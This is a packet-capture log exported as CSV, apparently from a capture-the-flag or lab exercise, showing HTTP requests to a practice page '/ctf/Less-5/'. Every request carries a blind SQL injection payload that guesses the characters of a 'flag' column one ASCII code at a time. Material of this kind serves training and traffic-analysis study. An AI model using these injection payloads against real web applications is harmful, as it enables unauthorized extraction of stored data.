"No.","Time","Source","Destination","Protocol","Length","Info"
"13316","6.410307873","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=101--+ HTTP/1.1 "
"13319","6.412291822","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13328","6.414753000","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=102--+ HTTP/1.1 "
"13331","6.416783622","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13340","6.419268816","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=103--+ HTTP/1.1 "
"13343","6.421506396","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13352","6.424132711","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=104--+ HTTP/1.1 "
"13355","6.426325084","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13364","6.428583131","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=105--+ HTTP/1.1 "
"13367","6.430644395","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13376","6.433087834","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=106--+ HTTP/1.1 "
"13379","6.435310414","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13388","6.437900729","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=107--+ HTTP/1.1 "
"13391","6.440170890","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13400","6.442337652","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=108--+ HTTP/1.1 "
"13403","6.444415723","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13412","6.446639165","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=109--+ HTTP/1.1 "
"13415","6.448861150","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13424","6.451163961","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=110--+ HTTP/1.1 "
"13427","6.453185430","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13436","6.455557474","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=111--+ HTTP/1.1 "
"13439","6.457775107","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13448","6.460062157","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=112--+ HTTP/1.1 "
"13451","6.462010788","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13460","6.464376480","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=113--+ HTTP/1.1 "
"13463","6.466445015","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13472","6.468689216","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=114--+ HTTP/1.1 "
"13475","6.470789624","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13484","6.473039634","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=115--+ HTTP/1.1 "
"13487","6.475256608","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13496","6.477707210","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=116--+ HTTP/1.1 "
"13499","6.479949190","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13508","6.482509376","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=117--+ HTTP/1.1 "
"13511","6.485004864","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13520","6.487622256","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=118--+ HTTP/1.1 "
"13523","6.489805217","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13532","6.492093626","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=119--+ HTTP/1.1 "
"13535","6.494155678","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13544","6.496511960","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=120--+ HTTP/1.1 "
"13547","6.498620108","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13556","6.501249948","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=121--+ HTTP/1.1 "
"13559","6.503577497","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13568","6.506048097","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=122--+ HTTP/1.1 "
"13571","6.508415665","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"13580","6.511062174","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=33--+ HTTP/1.1 "
"13583","6.513268084","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13592","6.515682361","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=34--+ HTTP/1.1 "
"13595","6.518157470","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13604","6.521326613","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=35--+ HTTP/1.1 "
"13607","6.523603656","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13616","6.526281709","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=36--+ HTTP/1.1 "
"13619","6.528605801","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13628","6.531227555","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=37--+ HTTP/1.1 "
"13631","6.533441232","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13641","6.538100782","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=38--+ HTTP/1.1 "
"13643","6.540663151","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13652","6.543247699","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=39--+ HTTP/1.1 "
"13655","6.545448132","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13664","6.547828450","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=40--+ HTTP/1.1 "
"13667","6.549962989","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13676","6.552512793","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=41--+ HTTP/1.1 "
"13679","6.554590483","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13688","6.556835880","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=42--+ HTTP/1.1 "
"13691","6.558821508","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13700","6.561374085","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=43--+ HTTP/1.1 "
"13703","6.563394778","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13712","6.565808938","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=44--+ HTTP/1.1 "
"13715","6.567915385","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13724","6.570285366","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=45--+ HTTP/1.1 "
"13727","6.572380479","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13736","6.574684214","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=46--+ HTTP/1.1 "
"13739","6.576697967","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13748","6.579145378","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=47--+ HTTP/1.1 "
"13751","6.581380731","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13760","6.583759191","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=48--+ HTTP/1.1 "
"13763","6.585695863","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13772","6.588208025","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=49--+ HTTP/1.1 "
"13775","6.590202157","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13784","6.592863960","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=50--+ HTTP/1.1 "
"13787","6.595118655","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13796","6.597639772","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=51--+ HTTP/1.1 "
"13799","6.599598898","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13808","6.601933025","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=52--+ HTTP/1.1 "
"13811","6.603982371","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13820","6.606291199","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=53--+ HTTP/1.1 "
"13823","6.608593898","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13832","6.611232344","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=54--+ HTTP/1.1 "
"13835","6.613485662","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13844","6.615726683","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=55--+ HTTP/1.1 "
"13847","6.618059860","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13856","6.621102252","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=56--+ HTTP/1.1 "
"13859","6.623415782","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13868","6.625753833","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=57--+ HTTP/1.1 "
"13871","6.628207614","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13880","6.630599418","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=58--+ HTTP/1.1 "
"13883","6.632942374","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13892","6.635292180","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=59--+ HTTP/1.1 "
"13895","6.637336938","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13904","6.639773481","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=60--+ HTTP/1.1 "
"13907","6.641815044","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13916","6.644151982","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=61--+ HTTP/1.1 "
"13919","6.646175045","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13928","6.648680343","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=62--+ HTTP/1.1 "
"13931","6.650695954","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13940","6.653248504","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=63--+ HTTP/1.1 "
"13943","6.655421753","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13952","6.657963340","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=64--+ HTTP/1.1 "
"13955","6.659914805","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13964","6.662150782","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=65--+ HTTP/1.1 "
"13967","6.664090840","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13976","6.666367099","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=66--+ HTTP/1.1 "
"13979","6.668311540","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13988","6.670658154","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=67--+ HTTP/1.1 "
"13991","6.672650266","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14000","6.675055139","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=68--+ HTTP/1.1 "
"14003","6.677093125","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14012","6.679359183","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=69--+ HTTP/1.1 "
"14015","6.681557380","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14024","6.684204768","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=70--+ HTTP/1.1 "
"14027","6.686418672","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14036","6.689003420","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=71--+ HTTP/1.1 "
"14039","6.691047637","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14048","6.693320008","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=72--+ HTTP/1.1 "
"14051","6.695270593","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14060","6.697521533","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=73--+ HTTP/1.1 "
"14066","6.699625168","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14075","6.702078748","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=74--+ HTTP/1.1 "
"14078","6.704053308","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14087","6.706326286","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=75--+ HTTP/1.1 "
"14090","6.708386990","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14099","6.710806544","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=76--+ HTTP/1.1 "
"14102","6.712864479","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14111","6.715544162","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=77--+ HTTP/1.1 "
"14114","6.717374155","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14123","6.719617762","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=78--+ HTTP/1.1 "
"14126","6.721648978","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14135","6.724189663","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=79--+ HTTP/1.1 "
"14138","6.726395125","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14147","6.729058019","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=80--+ HTTP/1.1 "
"14150","6.731138192","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14159","6.733600502","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=81--+ HTTP/1.1 "
"14162","6.735702953","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14171","6.738370334","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=82--+ HTTP/1.1 "
"14174","6.740560364","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14183","6.743258565","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=83--+ HTTP/1.1 "
"14186","6.745225345","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14195","6.747544307","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=84--+ HTTP/1.1 "
"14198","6.749561843","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14207","6.751950267","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=85--+ HTTP/1.1 "
"14210","6.753974897","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14219","6.756355169","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=86--+ HTTP/1.1 "
"14222","6.758368444","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"14231","6.760612782","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),18,1))=87--+ HTTP/1.1 "
"14234","6.762712149","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
